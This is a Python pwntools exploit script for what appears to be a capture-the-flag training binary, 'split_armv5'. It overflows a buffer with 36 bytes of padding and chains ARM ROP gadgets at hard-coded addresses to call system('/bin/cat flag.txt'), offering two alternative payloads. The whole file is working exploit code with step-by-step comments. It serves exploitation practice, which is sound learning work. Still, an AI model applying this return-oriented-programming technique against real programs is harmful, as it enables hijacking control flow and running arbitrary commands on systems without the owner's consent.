from pwn import *

BINARY = "./split_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)


cat_flag             = p32(0x2103c) # "/bin/cat flag.txt"
call_system          = p32(0x105E0) # bl system
PADDING              = b"BBBB"


def payload_1():
    pop_r45678_sb_sl_pc = p32(0x10644) # pop {r4, r5, r6, r7, r8, sb, sl, pc}   
    mov_r0_r7_blx_r3    = p32(0x10634) # mov r0, r7 ; blx r3
    pop_r3_pc           = p32(0x103a4) # pop {r3, pc}

    rop = b"A" * 36
    
    # Putting the address of "bl system" in r3
    # --> will be called thanks to 'blx r3' instruction
    rop += pop_r3_pc
    rop += call_system

    # Putting "/bin/cat flag.txt" in r7
    rop += pop_r45678_sb_sl_pc
    rop += PADDING
    rop += PADDING
    rop += PADDING
    rop += cat_flag
    rop += PADDING
    rop += PADDING
    rop += PADDING
    
    # Moving r7 to r0 (register for arg n°1) and calling system("/bin/cat flag.txt")
    rop += mov_r0_r7_blx_r3
    return rop


def payload_2():
    mov_r0_r3_pop_pop_pc = p32(0x10558) # mov r0, r3 ; pop {fp, pc}
    pop_r3_pc            = p32(0x103a4) # pop {r3, pc}
    
    rop = b'A' * 36

    # Putting "/bin/cat flag.txt" in r3
    rop += pop_r3_pc
    rop += cat_flag
    
    # Moving r3 to r0 and calling system("/bin/cat flag.txt")
    rop += mov_r0_r3_pop_pop_pc
    rop += PADDING
    rop += call_system
    return rop


# Change this value to use the payload n°1 or n°2
PAYLOAD = 1
SLICE = 2
rop = payload_1()

if PAYLOAD == 2:
    rop = payload_2()
    SLICE = 6

log.success(f"ROP chain : {rop}")
#pause() --> pause execution to debug with gdb -p <process PID>
p.sendline(rop)

flag = p.recvall(timeout=0.1).split(b'\n')[-SLICE]
log.success(f"FLAG : {flag}")
